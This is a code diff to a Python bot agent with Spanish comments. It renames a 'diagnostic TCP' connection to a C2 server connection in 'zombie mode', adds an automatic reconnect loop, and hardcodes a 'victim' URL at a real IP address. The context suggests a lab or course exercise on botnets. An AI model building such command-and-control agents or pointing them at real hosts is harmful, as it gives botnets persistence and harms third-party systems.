@@ -11,10 +11,11 @@ import urllib.request
 from identity import build_hello, build_heartbeat
 from commands import handle_command
 from protocol import encode_message, decode_message
-from aws_client import connect_diagnostic
+from aws_client import connect_diagnostic, EXIT_RETRY
+from reconnect_policy import reconnect_decision
 
 
-VERSION = "1.7"
+VERSION = "1.8"
 VICTIMA_URL = "http://44.214.54.41/"
 
 
@@ -79,21 +80,43 @@ def ejecutar_comando(nombre):
 
 
 def conectar_vm(agent_id):
-    """Abre la conexión de diagnóstico TCP."""
+    """Conecta al C2 con reconexión automática según la política."""
+    print("\nIniciando conexión con el servidor C2...")
 
-    print("\nIniciando diagnóstico TCP...")
+    attempts = 0
 
-    try:
-        asyncio.run(connect_diagnostic(agent_id))
+    while True:
+        try:
+            exit_code = asyncio.run(connect_diagnostic(agent_id))
 
-    except KeyboardInterrupt:
-        print("\nDesconectado por el usuario.")
+        except KeyboardInterrupt:
+            print("\nDesconectado por el usuario.")
+            return
 
-    except (
-        OSError,
-        asyncio.TimeoutError,
-    ) as error:
-        print(f"\nError de conexión: {error}")
+        except (OSError, asyncio.TimeoutError) as error:
+            print(f"\nError de conexión: {error}")
+            exit_code = EXIT_RETRY
+
+        if exit_code != EXIT_RETRY:
+            print("\nSesión finalizada.")
+            return
+
+        attempts += 1
+
+        decision = reconnect_decision(
+            {"type": "connection_lost"},
+            attempts=attempts,
+        )
+
+        if not decision["retry"]:
+            print("\nReintentos agotados; el agente queda desconectado.")
+            return
+
+        print(
+            f"\nReconectando en {decision['delay']} s "
+            f"(intento {attempts})..."
+        )
+        time.sleep(decision["delay"])
 
 
 def mostrar_menu():
@@ -105,7 +128,7 @@ def mostrar_menu():
     print("2. Mostrar información del equipo")
     print("3. Enviar HEARTBEAT local")
     print("4. Verificar servidor víctima")
-    print("5. Conectar a VM de diagnóstico TCP")
+    print("5. Conectar al servidor C2 (modo zombie)")
     print("6. Salir")
 
     print("=" * 48)
